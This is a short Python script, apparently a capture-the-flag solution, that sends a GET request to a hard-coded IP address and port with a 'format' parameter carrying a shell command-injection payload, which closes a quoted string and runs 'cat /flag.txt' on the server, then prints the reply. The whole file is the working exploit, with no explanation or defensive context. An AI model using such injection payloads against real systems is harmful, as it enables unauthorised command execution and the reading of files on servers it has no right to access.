#!/usr/bin/env python3


import requests

url="http://94.237.53.113:48213/?"

cred={
	'format':"'; cat /flag.txt ||'"
}

r=requests.get(url,params=cred)

print(r.text)